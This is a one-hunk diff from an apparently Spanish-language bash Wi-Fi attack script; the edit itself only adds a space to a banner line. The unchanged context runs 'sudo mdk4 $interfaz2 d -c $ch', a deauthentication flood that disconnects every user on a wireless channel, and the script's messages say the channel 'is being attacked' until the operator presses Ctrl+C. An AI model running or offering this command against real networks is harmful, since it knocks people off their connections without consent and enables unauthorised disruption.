@@ -102,7 +102,7 @@ echo
 echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten a las Redes Wifi)"
 echo
 echo "========================================================================================="
-echo "                           El Canal ($ch) esta siendo Atacado"
+echo "                            El Canal ($ch) esta siendo Atacado"
 echo "========================================================================================="
 echo
 sudo mdk4 $interfaz2 d -c $ch
